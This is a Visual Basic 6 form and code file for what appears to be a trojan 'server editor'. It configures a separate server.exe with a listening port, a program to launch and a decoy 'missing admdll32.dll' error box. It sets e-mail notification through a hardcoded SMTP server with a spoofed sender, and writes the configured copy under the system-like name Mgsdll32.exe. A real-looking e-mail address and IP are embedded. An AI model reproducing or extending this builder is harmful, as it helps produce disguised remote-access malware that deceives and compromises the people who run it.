VERSION 5.00
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Object = "{BDC217C8-ED16-11CD-956C-0000C04E4C0A}#1.1#0"; "TABCTL32.OCX"
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form Form1 
   BorderStyle     =   3  'Fixed Dialog
   Caption         =   "Editor"
   ClientHeight    =   4455
   ClientLeft      =   45
   ClientTop       =   435
   ClientWidth     =   4965
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   4455
   ScaleWidth      =   4965
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin MSComDlg.CommonDialog CommonDialog1 
      Left            =   2280
      Top             =   3600
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   3480
      Top             =   3600
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSComctlLib.ImageList ImageList1 
      Left            =   2880
      Top             =   3480
      _ExtentX        =   1005
      _ExtentY        =   1005
      BackColor       =   -2147483643
      ImageWidth      =   32
      ImageHeight     =   32
      MaskColor       =   12632256
      _Version        =   393216
      BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
         NumListImages   =   3
         BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":0CCA
            Key             =   ""
         EndProperty
         BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":15A4
            Key             =   ""
         EndProperty
         BeginProperty ListImage3 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":1E7E
            Key             =   ""
         EndProperty
      EndProperty
   End
   Begin TabDlg.SSTab SSTab1 
      Height          =   4455
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   4965
      _ExtentX        =   8758
      _ExtentY        =   7858
      _Version        =   393216
      Tab             =   2
      TabHeight       =   520
      TabCaption(0)   =   "E-Mail"
      TabPicture(0)   =   "Form1.frx":2B58
      Tab(0).ControlEnabled=   0   'False
      Tab(0).Control(0)=   "Frame1"
      Tab(0).Control(0).Enabled=   0   'False
      Tab(0).ControlCount=   1
      TabCaption(1)   =   "Msgbox"
      TabPicture(1)   =   "Form1.frx":2B74
      Tab(1).ControlEnabled=   0   'False
      Tab(1).Control(0)=   "Frame5"
      Tab(1).Control(0).Enabled=   0   'False
      Tab(1).ControlCount=   1
      TabCaption(2)   =   "Save"
      TabPicture(2)   =   "Form1.frx":2B90
      Tab(2).ControlEnabled=   -1  'True
      Tab(2).Control(0)=   "Frame6"
      Tab(2).Control(0).Enabled=   0   'False
      Tab(2).ControlCount=   1
      Begin VB.Frame Frame6 
         Height          =   3975
         Left            =   140
         TabIndex        =   28
         Top             =   360
         Width           =   4695
         Begin VB.Frame Frame8 
            Height          =   615
            Left            =   120
            TabIndex        =   35
            Top             =   1440
            Width           =   4455
            Begin VB.TextBox Text5 
               Alignment       =   2  'Center
               Appearance      =   0  'Flat
               Height          =   285
               Left            =   1800
               TabIndex        =   36
               Text            =   "c:\windows\NOTEPAD.EXE"
               Top             =   240
               Width           =   2535
            End
            Begin VB.Label Label8 
               AutoSize        =   -1  'True
               BackStyle       =   0  'Transparent
               Caption         =   "Run Program:"
               BeginProperty Font 
                  Name            =   "MS Sans Serif"
                  Size            =   12
                  Charset         =   0
                  Weight          =   700
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Height          =   300
               Left            =   120
               TabIndex        =   37
               Top             =   240
               Width           =   1665
            End
         End
         Begin VB.Frame Frame7 
            Height          =   615
            Left            =   120
            TabIndex        =   32
            Top             =   840
            Width           =   4455
            Begin VB.TextBox Text4 
               Alignment       =   2  'Center
               Appearance      =   0  'Flat
               Height          =   285
               Left            =   1800
               TabIndex        =   33
               Text            =   "1981"
               Top             =   240
               Width           =   2535
            End
            Begin VB.Label Label7 
               AutoSize        =   -1  'True
               BackStyle       =   0  'Transparent
               Caption         =   "Port:"
               BeginProperty Font 
                  Name            =   "MS Sans Serif"
                  Size            =   12
                  Charset         =   0
                  Weight          =   700
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Height          =   300
               Left            =   1200
               TabIndex        =   34
               Top             =   240
               Width           =   585
            End
         End
         Begin MSComctlLib.Toolbar Toolbar3 
            Height          =   600
            Left            =   960
            TabIndex        =   30
            Top             =   3240
            Width           =   645
            _ExtentX        =   1138
            _ExtentY        =   1058
            ButtonWidth     =   1984
            ButtonHeight    =   1005
            Style           =   1
            TextAlignment   =   1
            ImageList       =   "ImageList1"
            _Version        =   393216
            BeginProperty Buttons {66833FE8-8583-11D1-B16A-00C0F0283628} 
               NumButtons      =   1
               BeginProperty Button1 {66833FEA-8583-11D1-B16A-00C0F0283628} 
                  ImageIndex      =   2
               EndProperty
            EndProperty
            BorderStyle     =   1
         End
         Begin MSComctlLib.Toolbar Toolbar4 
            Height          =   600
            Left            =   240
            TabIndex        =   31
            Top             =   3240
            Width           =   645
            _ExtentX        =   1138
            _ExtentY        =   1058
            ButtonWidth     =   1984
            ButtonHeight    =   1005
            Style           =   1
            TextAlignment   =   1
            ImageList       =   "ImageList1"
            _Version        =   393216
            BeginProperty Buttons {66833FE8-8583-11D1-B16A-00C0F0283628} 
               NumButtons      =   1
               BeginProperty Button1 {66833FEA-8583-11D1-B16A-00C0F0283628} 
                  ImageIndex      =   3
               EndProperty
            EndProperty
            BorderStyle     =   1
         End
         Begin VB.Shape Shape3 
            BorderColor     =   &H80000002&
            Height          =   495
            Left            =   1560
            Top             =   240
            Width           =   1575
         End
         Begin VB.Label Label6 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Edit Server"
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   12
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   300
            Left            =   1680
            TabIndex        =   29
            Top             =   360
            Width           =   1350
         End
         Begin VB.Image Image3 
            Height          =   480
            Left            =   360
            Picture         =   "Form1.frx":2BAC
            Top             =   240
            Width           =   480
         End
      End
      Begin VB.Frame Frame5 
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   12
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   3975
         Left            =   -74920
         TabIndex        =   14
         Top             =   360
         Width           =   4815
         Begin VB.Frame Frame11 
            Height          =   615
            Left            =   120
            TabIndex        =   21
            Top             =   1080
            Width           =   4575
            Begin VB.OptionButton Option1 
               Caption         =   "vbquestion"
               BeginProperty Font 
                  Name            =   "MS Sans Serif"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   700
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Height          =   255
               Index           =   2
               Left            =   3000
               TabIndex        =   24
               Top             =   240
               Width           =   1455
            End
            Begin VB.OptionButton Option1 
               Caption         =   "vbinformation"
               BeginProperty Font 
                  Name            =   "MS Sans Serif"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   700
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Height          =   255
               Index           =   1
               Left            =   1320
               TabIndex        =   23
               Top             =   240
               Width           =   1575
            End
            Begin VB.OptionButton Option1 
               Caption         =   "vbcritical"
               BeginProperty Font 
                  Name            =   "MS Sans Serif"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   700
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Height          =   255
               Index           =   0
               Left            =   120
               TabIndex        =   22
               Top             =   240
               Value           =   -1  'True
               Width           =   1215
            End
         End
         Begin VB.Frame Frame10 
            Height          =   615
            Left            =   120
            TabIndex        =   18
            Top             =   2280
            Width           =   4575
            Begin VB.TextBox Text8 
               Appearance      =   0  'Flat
               Height          =   285
               Left            =   1320
               TabIndex        =   19
               Text            =   "System32"
               Top             =   260
               Width           =   3135
            End
            Begin VB.Label Label10 
               AutoSize        =   -1  'True
               BackStyle       =   0  'Transparent
               Caption         =   "Titulo:"
               BeginProperty Font 
                  Name            =   "MS Sans Serif"
                  Size            =   12
                  Charset         =   0
                  Weight          =   700
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Height          =   300
               Left            =   480
               TabIndex        =   20
               Top             =   240
               Width           =   750
            End
         End
         Begin VB.Frame Frame9 
            Height          =   615
            Left            =   120
            TabIndex        =   15
            Top             =   1680
            Width           =   4575
            Begin VB.TextBox Text7 
               Appearance      =   0  'Flat
               Height          =   285
               Left            =   1320
               TabIndex        =   16
               Text            =   "I sorry, it does not find admdll32.dll"
               Top             =   260
               Width           =   3135
            End
            Begin VB.Label Label9 
               AutoSize        =   -1  'True
               BackStyle       =   0  'Transparent
               Caption         =   "Message:"
               BeginProperty Font 
                  Name            =   "MS Sans Serif"
                  Size            =   12
                  Charset         =   0
                  Weight          =   700
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Height          =   300
               Left            =   120
               TabIndex        =   17
               Top             =   240
               Width           =   1170
            End
         End
         Begin MSComctlLib.Toolbar Toolbar2 
            Height          =   600
            Left            =   2040
            TabIndex        =   27
            Top             =   3120
            Width           =   640
            _ExtentX        =   1138
            _ExtentY        =   1058
            ButtonWidth     =   1984
            ButtonHeight    =   1005
            Style           =   1
            TextAlignment   =   1
            ImageList       =   "ImageList1"
            _Version        =   393216
            BeginProperty Buttons {66833FE8-8583-11D1-B16A-00C0F0283628} 
               NumButtons      =   1
               BeginProperty Button1 {66833FEA-8583-11D1-B16A-00C0F0283628} 
                  ImageIndex      =   1
               EndProperty
            EndProperty
            BorderStyle     =   1
         End
         Begin VB.Shape Shape2 
            BorderColor     =   &H80000002&
            Height          =   495
            Left            =   1560
            Top             =   240
            Width           =   1575
         End
         Begin VB.Label Label13 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Msgbox"
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   12
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   300
            Left            =   1920
            TabIndex        =   26
            Top             =   780
            Width           =   930
         End
         Begin VB.Image Image2 
            Height          =   480
            Left            =   360
            Picture         =   "Form1.frx":3876
            Top             =   240
            Width           =   480
         End
         Begin VB.Label Label11 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Edit Server"
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   12
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   300
            Left            =   1680
            TabIndex        =   25
            Top             =   360
            Width           =   1350
         End
      End
      Begin VB.Frame Frame1 
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   12
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   3975
         Left            =   -74920
         TabIndex        =   1
         Top             =   360
         Width           =   4815
         Begin MSComctlLib.Toolbar Toolbar1 
            Height          =   600
            Left            =   2040
            TabIndex        =   13
            Top             =   3120
            Width           =   645
            _ExtentX        =   1138
            _ExtentY        =   1058
            ButtonWidth     =   1984
            ButtonHeight    =   1005
            Style           =   1
            TextAlignment   =   1
            ImageList       =   "ImageList1"
            _Version        =   393216
            BeginProperty Buttons {66833FE8-8583-11D1-B16A-00C0F0283628} 
               NumButtons      =   1
               BeginProperty Button1 {66833FEA-8583-11D1-B16A-00C0F0283628} 
                  ImageIndex      =   1
               EndProperty
            EndProperty
            BorderStyle     =   1
         End
         Begin VB.Frame Frame2 
            Height          =   615
            Left            =   120
            TabIndex        =   8
            Top             =   1200
            Width           =   4575
            Begin VB.TextBox Text1 
               Appearance      =   0  'Flat
               Height          =   285
               Left            =   1080
               TabIndex        =   9
               Text            =   "213.4.129.129"
               Top             =   260
               Width           =   3375
            End
            Begin VB.Label Label2 
               AutoSize        =   -1  'True
               BackStyle       =   0  'Transparent
               Caption         =   "Server:"
               BeginProperty Font 
                  Name            =   "MS Sans Serif"
                  Size            =   12
                  Charset         =   0
                  Weight          =   700
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Height          =   300
               Left            =   120
               TabIndex        =   10
               Top             =   240
               Width           =   870
            End
         End
         Begin VB.Frame Frame3 
            Height          =   615
            Left            =   120
            TabIndex        =   5
            Top             =   1800
            Width           =   4575
            Begin VB.TextBox Text2 
               Appearance      =   0  'Flat
               Height          =   285
               Left            =   1080
               TabIndex        =   6
               Text            =   "sande400@terra.es"
               Top             =   260
               Width           =   3375
            End
            Begin VB.Label Label3 
               AutoSize        =   -1  'True
               BackStyle       =   0  'Transparent
               Caption         =   "E-Mail:"
               BeginProperty Font 
                  Name            =   "MS Sans Serif"
                  Size            =   12
                  Charset         =   0
                  Weight          =   700
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Height          =   300
               Left            =   120
               TabIndex        =   7
               Top             =   240
               Width           =   840
            End
         End
         Begin VB.Frame Frame4 
            Height          =   615
            Left            =   120
            TabIndex        =   2
            Top             =   2400
            Width           =   4575
            Begin VB.TextBox Text3 
               Appearance      =   0  'Flat
               Height          =   285
               Left            =   1080
               TabIndex        =   3
               Text            =   "downloader2"
               Top             =   260
               Width           =   3375
            End
            Begin VB.Label Label4 
               AutoSize        =   -1  'True
               BackStyle       =   0  'Transparent
               Caption         =   "Asunto:"
               BeginProperty Font 
                  Name            =   "MS Sans Serif"
                  Size            =   12
                  Charset         =   0
                  Weight          =   700
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Height          =   300
               Left            =   120
               TabIndex        =   4
               Top             =   240
               Width           =   945
            End
         End
         Begin VB.Label Label1 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Edit Server"
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   12
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   300
            Left            =   1680
            TabIndex        =   12
            Top             =   360
            Width           =   1350
         End
         Begin VB.Image Image1 
            Height          =   480
            Left            =   360
            Picture         =   "Form1.frx":4540
            Top             =   240
            Width           =   480
         End
         Begin VB.Label Label5 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Correo"
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   12
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   300
            Left            =   1920
            TabIndex        =   11
            Top             =   960
            Width           =   825
         End
         Begin VB.Shape Shape1 
            BorderColor     =   &H80000002&
            Height          =   495
            Left            =   1560
            Top             =   240
            Width           =   1575
         End
      End
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Dim rook As String
Private Sub Form_Load()
ras = 16
End Sub

Private Sub Option1_Click(Index As Integer)
Select Case Index
Case 0
ras = 16
Case 2
ras = 32
Case 1
ras = 64
End Select
End Sub



Private Sub Toolbar1_ButtonClick(ByVal Button As MSComctlLib.Button)
If Text1 = "" Or Text2 = "" Then MsgBox "The addressee this one blank", vbCritical, "Edit": Exit Sub
Form2.Text1 = ""
Form2.Show
Winsock1.Close
Winsock1.Connect Trim(Text1), 25
End Sub

Private Sub Toolbar2_ButtonClick(ByVal Button As MSComctlLib.Button)
MsgBox Text7, ras, Text8
End Sub

Private Sub Toolbar3_ButtonClick(ByVal Button As MSComctlLib.Button)
On Error GoTo ema
FileCopy rook, App.path & "\" & "Mgsdll32.exe"
DoEvents
Save App.path & "\" & "Mgsdll32.exe"
MsgBox "Data kept correctly", vbInformation, "Edit"
Exit Sub
ema:
MsgBox "An error was  produced " & Err.Number & " " & Err.Description, vbCritical, "Edit"

End Sub

Private Sub Toolbar4_ButtonClick(ByVal Button As MSComctlLib.Button)
On Error GoTo ema
With CommonDialog1
.CancelError = True
.DialogTitle = "Open..."
.FileName = "server.exe"
.Filter = "server.exe|server.exe"
.ShowOpen
If Len(.FileName) = 0 Then Exit Sub
rook = .FileName

End With
ema:
End Sub

Private Sub Winsock1_Connect()
Winsock1.SendData "helo" & vbCrLf
Winsock1.SendData "Mail From:" & "<ErcUn@elfeo.com>" & vbCrLf
Winsock1.SendData "rcpt to:" & Trim(Text2) & vbCrLf
Winsock1.SendData "data" & vbCrLf
Winsock1.SendData "subject:" & Text3 & vbCrLf
Winsock1.SendData "." & vbCrLf
End Sub

Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
Dim g As String
Winsock1.GetData g
Form2.Text1 = Form2.Text1 & g & vbCrLf
If Left(g, 3) = "250" Then
Winsock1.SendData "quit"
Winsock1.Close
Form2.Text1 = Form2.Text1 & "The I send email correctly" & vbCrLf
End If
End Sub

Private Sub Winsock1_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
Winsock1.Close
End Sub
